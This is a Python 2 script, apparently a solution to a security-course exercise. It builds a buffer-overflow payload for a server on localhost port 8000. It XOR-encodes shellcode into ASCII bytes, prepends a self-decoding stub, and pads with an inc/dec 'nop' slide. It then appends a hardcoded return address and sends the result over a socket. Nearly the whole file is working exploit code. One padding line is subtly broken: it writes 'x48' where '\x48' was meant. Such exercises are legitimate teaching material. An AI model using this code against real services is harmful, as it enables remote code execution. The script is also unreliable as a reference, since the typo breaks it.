#!/usr/bin/python

import os, socket, struct
import q2


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f

def encoder(shellcode):
    encoded_shellcode = ''
    for c in shellcode:
        if(ord(c) >= 0x80):
            encoded_shellcode = encoded_shellcode + chr(ord(c)^0xff)
        else:
            encoded_shellcode = encoded_shellcode + c
    return encoded_shellcode

def get_raw_shellcode():
    return q2.get_shellcode()


def get_shellcode():
    '''This function returns the machine code (bytes) of the shellcode.
    
    This does not include the size, return address, nop slide or anything else!
    From this function you should return only the shellcode!
    '''
    shellcode = get_raw_shellcode()
    print(len(shellcode))
    new_shellcode = encoder(shellcode) #encode the shellcode
    length = len(new_shellcode)
    for i in range(length):
        # xor byte ptr [eax], bl
        # dec eax
        new_shellcode = '\x30\x18\x48' + new_shellcode
    # push 0
    # pop ebx
    # dec ebx #no ebx = 0xffffffff and thus bl = 0xff
    new_shellcode = '\x6a\x00\x5b\x4b' + new_shellcode
    
    # dec eax ;|shellcode| + 4 times
    for i in range(len(shellcode)+4):
        new_shellcode = 'x48' + new_shellcode

    # push esp
    # pop eax ;eax now holds the end address of the encoded shellcode    
    new_shellcode = '\x54\x58' + new_shellcode 


    return new_shellcode

    # Encode the shellcode

    # NOTES:
    # 1. Don't delete this function - we are going to test it directly.
    # 2. You should use the shellcode you implemented in the previous question,
    #    by calling `get_raw_shellcode()`


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode and the return address.
    '''

    total_size = 1040 #Size of the payload not including the first 4 bytes
    shellcode = get_shellcode()
    print(len(shellcode))
    number_of_nops = total_size - len (shellcode) #Calculate the size of the nop slide
    ra = 0xbfffde0e + int(number_of_nops/2) #land in the middle of nopslide, for testing on debug used static vlaue of 0xbfffde0e + 450 = 0xbfffdfd0
    nop_slide = '\x41\x49' * (number_of_nops/2)     #creating the "nop" slide made of inc ecx & dec ecx
    if(len(nop_slide)%2 != 0):
        nop_slide = nop_slide + '\x43' #if the length of the nop slide is odd add one mroe inc ebx
    payload = nop_slide + shellcode + str(struct.pack('<L', ra))
    return str(struct.pack('>L', len(payload))) + payload

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    payload = get_payload()
    print(len(payload))
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
